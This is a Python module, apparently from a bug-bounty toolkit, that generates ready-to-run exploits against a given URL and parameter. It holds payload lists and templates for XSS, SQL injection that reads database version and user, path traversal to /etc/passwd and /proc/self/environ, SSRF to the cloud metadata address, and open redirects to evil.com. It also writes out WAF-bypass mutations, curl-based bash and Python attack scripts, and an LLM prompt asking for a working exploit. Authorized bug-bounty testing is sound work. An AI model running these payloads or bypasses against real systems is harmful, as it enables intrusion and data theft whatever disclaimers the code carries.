"""
Exploit Generator

AI-powered exploit generation for bug bounty hunting.
Generates proof-of-concept exploits for discovered vulnerabilities
with ethical safeguards and responsible disclosure guidelines.
"""

import json
from typing import Dict, Optional, Any, List
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import base64
import urllib.parse
import logging

logger = logging.getLogger(__name__)


class ExploitType(Enum):
    """Types of exploits"""
    POC = "Proof of Concept"
    MANUAL = "Manual Exploitation Steps"
    AUTOMATED = "Automated Exploit Script"
    CURL = "cURL Command"
    PYTHON = "Python Script"
    JAVASCRIPT = "JavaScript Payload"


@dataclass
class Exploit:
    """Generated exploit"""
    vulnerability_title: str
    exploit_type: ExploitType
    code: str
    
    # Details
    description: str = ""
    prerequisites: List[str] = field(default_factory=list)
    steps: List[str] = field(default_factory=list)
    expected_output: str = ""
    
    # Safety
    disclaimer: str = "FOR AUTHORIZED TESTING ONLY - Bug Bounty Programs"
    safe_payload: bool = True  # Non-destructive payload
    requires_authentication: bool = False
    
    # Metadata
    created_at: datetime = field(default_factory=datetime.now)
    tested: bool = False
    success_rate: Optional[float] = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "vulnerability": self.vulnerability_title,
            "type": self.exploit_type.value,
            "code": self.code,
            "description": self.description,
            "prerequisites": self.prerequisites,
            "steps": self.steps,
            "expected_output": self.expected_output,
            "disclaimer": self.disclaimer,
            "safe_payload": self.safe_payload,
            "created_at": self.created_at.isoformat()
        }


class ExploitGenerator:
    """
    AI-powered exploit generator
    
    Features:
    - Generates proof-of-concept exploits
    - Creates safe, non-destructive payloads
    - Provides step-by-step exploitation guides
    - Generates cURL commands for quick testing
    - Creates Python scripts for automation
    - Includes ethical safeguards
    """
    
    def __init__(self, ai_client=None):
        """
        Initialize exploit generator
        
        Args:
            ai_client: AI client for intelligent exploit generation
        """
        self.ai_client = ai_client
        
        # Safe payloads (non-destructive)
        self.safe_payloads = {
            'xss': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS")',
                '"><script>console.log("XSS")</script>'
            ],
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "admin'--"
            ],
            'lfi': [
                '../../../etc/passwd',
                '....//....//....//etc/passwd',
                '/etc/passwd%00',
                'php://filter/convert.base64-encode/resource=index.php'
            ],
            'ssrf': [
                'http://localhost',
                'http://169.254.169.254/latest/meta-data/',
                'http://[::1]',
                'http://127.0.0.1:80'
            ],
            'open_redirect': [
                '//evil.com',
                'https://evil.com',
                '///evil.com',
                '/\\evil.com'
            ]
        }
    
    def generate_xss_exploit(
        self,
        url: str,
        parameter: str,
        reflection_context: str = "html"
    ) -> Exploit:
        """
        Generate XSS exploit
        
        Args:
            url: Vulnerable URL
            parameter: Vulnerable parameter
            reflection_context: Where payload is reflected (html, js, attribute)
            
        Returns:
            XSS exploit
        """
        # Choose payload based on context
        if reflection_context == "javascript":
            payload = '"-alert("XSS")-"'
        elif reflection_context == "attribute":
            payload = '" onmouseover="alert(\'XSS\')"'
        else:  # html
            payload = '<script>alert("XSS")</script>'
        
        # URL encode
        encoded_payload = urllib.parse.quote(payload)
        
        # Build exploit URL
        exploit_url = f"{url}?{parameter}={encoded_payload}"
        
        # cURL command
        curl_command = f'curl "{exploit_url}"'
        
        # Build exploit
        exploit = Exploit(
            vulnerability_title=f"Reflected XSS in {parameter} parameter",
            exploit_type=ExploitType.CURL,
            code=curl_command,
            description=f"XSS vulnerability in parameter '{parameter}'",
            prerequisites=[
                "Target accepts GET requests",
                "No XSS filters in place"
            ],
            steps=[
                f"1. Open browser to: {exploit_url}",
                "2. Observe alert dialog",
                "3. Check browser console for errors",
                "4. Verify script execution in page source"
            ],
            expected_output="Alert dialog showing 'XSS'",
            safe_payload=True
        )
        
        return exploit
    
    def generate_sqli_exploit(
        self,
        url: str,
        parameter: str,
        database_type: str = "MySQL"
    ) -> Exploit:
        """
        Generate SQL Injection exploit
        
        Args:
            url: Vulnerable URL
            parameter: Vulnerable parameter
            database_type: Database type (MySQL, PostgreSQL, MSSQL)
            
        Returns:
            SQL injection exploit
        """
        # Safe payload for detection
        if database_type == "MySQL":
            payload = "' UNION SELECT NULL,NULL,NULL,VERSION(),DATABASE(),USER()-- -"
        elif database_type == "PostgreSQL":
            payload = "' UNION SELECT NULL,NULL,NULL,version(),current_database(),current_user-- -"
        else:  # MSSQL
            payload = "' UNION SELECT NULL,NULL,NULL,@@version,DB_NAME(),USER_NAME()-- -"
        
        encoded_payload = urllib.parse.quote(payload)
        exploit_url = f"{url}?{parameter}={encoded_payload}"
        
        # Python script for automated exploitation
        python_script = f'''#!/usr/bin/env python3
"""
SQL Injection Exploit - FOR AUTHORIZED TESTING ONLY
Target: {url}
Parameter: {parameter}
"""

import requests

def test_sql_injection():
    """Test for SQL injection vulnerability"""
    
    # Target URL
    url = "{url}"
    
    # Payloads to test
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "{payload}"
    ]
    
    print("[*] Testing SQL Injection...")
    
    for payload in payloads:
        params = {{"{parameter}": payload}}
        
        try:
            response = requests.get(url, params=params, timeout=10)
            print(f"\\n[+] Payload: {{payload}}")
            print(f"[+] Status: {{response.status_code}}")
            print(f"[+] Length: {{len(response.text)}}")
            
            # Check for SQL errors or database output
            error_keywords = [
                "SQL syntax", "mysql_fetch", "PostgreSQL", "ORA-",
                "Microsoft SQL", "ODBC", "SQLite"
            ]
            
            for keyword in error_keywords:
                if keyword in response.text:
                    print(f"[!] Found SQL error: {{keyword}}")
                    print(f"[!] Likely vulnerable!")
                    return True
                    
        except Exception as e:
            print(f"[-] Error: {{e}}")
    
    print("\\n[*] Testing complete")
    return False

if __name__ == "__main__":
    print("=" * 60)
    print("SQL Injection Testing Tool")
    print("FOR AUTHORIZED BUG BOUNTY TESTING ONLY")
    print("=" * 60)
    
    test_sql_injection()
'''
        
        exploit = Exploit(
            vulnerability_title=f"SQL Injection in {parameter} parameter",
            exploit_type=ExploitType.PYTHON,
            code=python_script,
            description=f"SQL injection vulnerability allowing database enumeration",
            prerequisites=[
                "Target accepts URL parameters",
                "Database errors visible",
                "UNION injection works"
            ],
            steps=[
                "1. Run the Python script",
                "2. Observe database version/name in output",
                "3. Enumerate tables with UNION SELECT",
                "4. Extract sensitive data (authorized targets only)"
            ],
            expected_output=f"{database_type} version and database name",
            safe_payload=True,
            requires_authentication=False
        )
        
        return exploit
    
    def generate_lfi_exploit(
        self,
        url: str,
        parameter: str
    ) -> Exploit:
        """
        Generate Local File Inclusion exploit
        
        Args:
            url: Vulnerable URL
            parameter: Vulnerable parameter
            
        Returns:
            LFI exploit
        """
        # Safe file to read (exists on Linux systems)
        payload = "../../../etc/passwd"
        encoded_payload = urllib.parse.quote(payload)
        exploit_url = f"{url}?{parameter}={encoded_payload}"
        
        bash_script = f'''#!/bin/bash
# LFI Exploit - FOR AUTHORIZED TESTING ONLY
# Target: {url}

echo "Testing Local File Inclusion..."

# Files to test
files=(
    "../../../etc/passwd"
    "....//....//....//etc/passwd"
    "php://filter/convert.base64-encode/resource=index.php"
    "../../../proc/self/environ"
)

for file in "${{files[@]}}"; do
    echo ""
    echo "[+] Testing: $file"
    
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$file'))")
    curl -s "{url}?{parameter}=$encoded" | head -20
    
    sleep 1
done

echo ""
echo "[*] Testing complete"
'''
        
        exploit = Exploit(
            vulnerability_title=f"Local File Inclusion in {parameter}",
            exploit_type=ExploitType.MANUAL,
            code=bash_script,
            description="LFI vulnerability allowing arbitrary file reading",
            prerequisites=[
                "File parameter not properly validated",
                "Server allows path traversal"
            ],
            steps=[
                f"1. Visit: {exploit_url}",
                "2. Look for /etc/passwd contents",
                "3. Try different traversal depths (../, ../../, etc.)",
                "4. Test PHP wrappers if applicable"
            ],
            expected_output="Contents of /etc/passwd file",
            safe_payload=True
        )
        
        return exploit
    
    async def ai_generate_exploit(
        self,
        vulnerability: Dict[str, Any],
        target_info: Dict[str, Any]
    ) -> Exploit:
        """
        Use AI to generate custom exploit
        
        Args:
            vulnerability: Vulnerability details
            target_info: Target information (URL, tech stack, etc.)
            
        Returns:
            AI-generated exploit
        """
        if not self.ai_client:
            raise ValueError("AI client not configured")
        
        vuln_type = vulnerability.get('type', 'Unknown')
        url = vulnerability.get('url', '')
        parameter = vulnerability.get('parameter', '')
        
        prompt = f"""Generate a proof-of-concept exploit for this vulnerability:

Vulnerability Type: {vuln_type}
URL: {url}
Parameter: {parameter}
Technologies: {target_info.get('technologies', [])}

Requirements:
1. SAFE and NON-DESTRUCTIVE payload only
2. For authorized bug bounty testing only
3. Detailed step-by-step exploitation guide
4. Include cURL command or Python script
5. Expected output/behavior
6. Prerequisites and limitations

Generate a working exploit with clear instructions.
"""
        
        try:
            from src.cognitive.llm.model_loader import ModelLoader
            loader = ModelLoader()
            
            response = loader.generate(
                prompt=prompt,
                task_type="code",
                max_tokens=1500
            )
            
            exploit = Exploit(
                vulnerability_title=f"{vuln_type} - {url}",
                exploit_type=ExploitType.POC,
                code=response,
                description=f"AI-generated exploit for {vuln_type}",
                safe_payload=True
            )
            
            return exploit
            
        except Exception as e:
            logger.error(f"AI exploit generation failed: {e}")
            raise
    
    def generate_bypass_techniques(
        self,
        vulnerability_type: str,
        blocked_payload: str
    ) -> List[str]:
        """
        Generate WAF/filter bypass techniques
        
        Args:
            vulnerability_type: Type of vulnerability
            blocked_payload: Payload that was blocked
            
        Returns:
            List of bypass variations
        """
        bypasses = []
        
        if vulnerability_type.lower() == "xss":
            # XSS bypass techniques
            bypasses = [
                blocked_payload.replace("<", "%3C").replace(">", "%3E"),
                blocked_payload.replace("<", "\\u003c").replace(">", "\\u003e"),
                blocked_payload.replace("script", "scr<>ipt"),
                blocked_payload.replace("script", "scr\x00ipt"),
                blocked_payload.replace(" ", "/**/"),
                blocked_payload.upper(),
                blocked_payload.replace("alert", "prompt"),
                f"<svg/onload={blocked_payload.replace('<script>', '').replace('</script>', '')}>",
            ]
        
        elif vulnerability_type.lower() == "sql injection":
            # SQLi bypass techniques
            bypasses = [
                blocked_payload.replace(" ", "/**/"),
                blocked_payload.replace("'", "''"),
                blocked_payload.replace("OR", "||"),
                blocked_payload.replace("UNION", "UNION/**/"),
                blocked_payload.replace("SELECT", "SEL/**/ECT"),
                blocked_payload.upper(),
                blocked_payload.replace(" ", "%09"),  # Tab
                blocked_payload.replace(" ", "%0a"),  # Newline
            ]
        
        return bypasses
    
    def generate_chained_exploit(
        self,
        vulnerabilities: List[Dict[str, Any]]
    ) -> Exploit:
        """
        Generate chained exploit combining multiple vulnerabilities
        
        Args:
            vulnerabilities: List of vulnerabilities to chain
            
        Returns:
            Chained exploit
        """
        if len(vulnerabilities) < 2:
            raise ValueError("Need at least 2 vulnerabilities to chain")
        
        # Example: CSRF + Stored XSS = Account takeover
        vuln_types = [v.get('type', '').lower() for v in vulnerabilities]
        
        chain_description = f"Chained exploit combining: {', '.join(vuln_types)}"
        
        steps = [
            "CHAINED EXPLOITATION GUIDE",
            "=" * 50,
            "",
            "This exploit chains multiple vulnerabilities for higher impact:",
            ""
        ]
        
        for i, vuln in enumerate(vulnerabilities, 1):
            steps.append(f"Step {i}: Exploit {vuln.get('type', 'Unknown')}")
            steps.append(f"  URL: {vuln.get('url', 'N/A')}")
            steps.append(f"  Impact: {vuln.get('impact', 'N/A')}")
            steps.append("")
        
        steps.append("Combined Impact:")
        steps.append("  The chain allows for [describe combined impact]")
        steps.append("")
        steps.append("IMPORTANT: Only test on authorized targets!")
        
        exploit = Exploit(
            vulnerability_title="Chained Vulnerability Exploit",
            exploit_type=ExploitType.MANUAL,
            code="\n".join(steps),
            description=chain_description,
            safe_payload=True,
            prerequisites=["Multiple vulnerabilities present", "Authorized testing only"]
        )
        
        return exploit


# Example usage
if __name__ == "__main__":
    generator = ExploitGenerator()
    
    # Generate XSS exploit
    xss_exploit = generator.generate_xss_exploit(
        url="https://example.com/search",
        parameter="q",
        reflection_context="html"
    )
    
    print("XSS Exploit Generated:")
    print(f"Title: {xss_exploit.vulnerability_title}")
    print(f"Type: {xss_exploit.exploit_type.value}")
    print(f"Code:\n{xss_exploit.code}")
    print(f"\nSteps:")
    for step in xss_exploit.steps:
        print(f"  {step}")
    
    print("\n" + "=" * 60)
    
    # Generate SQLi exploit
    sqli_exploit = generator.generate_sqli_exploit(
        url="https://example.com/product",
        parameter="id",
        database_type="MySQL"
    )
    
    print("\nSQL Injection Exploit Generated:")
    print(f"Title: {sqli_exploit.vulnerability_title}")
    print(f"Safe: {sqli_exploit.safe_payload}")
    print(f"\nDisclaimer: {sqli_exploit.disclaimer}")
